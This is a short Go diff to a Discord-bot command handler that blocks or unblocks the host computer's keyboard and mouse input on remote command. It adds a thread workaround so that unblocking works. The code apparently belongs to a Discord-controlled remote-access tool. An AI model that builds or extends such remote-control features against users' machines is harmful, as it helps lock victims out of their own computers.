@@ -79,6 +79,14 @@ func (*InputCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 	if utils.HasFlag(content, "block") {
 		err = funcs.DisableInputs(true)
 	} else if utils.HasFlag(content, "unblock") {
+		// BlockInput(false) can only unblock blocked input
+		// if it was blocked in the same thread
+		//
+		// since every command
+		// spawns a new thread we need to BlockInput(true) before
+		// unblocking it
+
+		funcs.DisableInputs(true)
 		err = funcs.DisableInputs(false)
 	} else {
 		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
